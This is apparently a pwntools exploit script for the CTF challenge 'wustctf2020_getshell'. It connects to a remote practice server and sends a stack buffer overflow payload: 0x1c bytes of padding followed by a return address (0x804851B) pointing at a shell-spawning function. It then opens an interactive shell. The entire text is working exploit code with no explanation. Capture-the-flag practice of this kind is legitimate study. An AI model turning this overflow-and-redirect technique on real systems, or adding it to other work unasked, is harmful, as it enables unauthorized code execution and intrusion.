from pwn import *

context(log_level='debug')

#io=process("./wustctf2020_getshell")
io=remote("node3.buuoj.cn",25599)
elf=ELF("./wustctf2020_getshell")

shell=0x804851B

payload=b'A'*(0x18+0x4)+p32(shell)

io.sendline(payload)

io.interactive()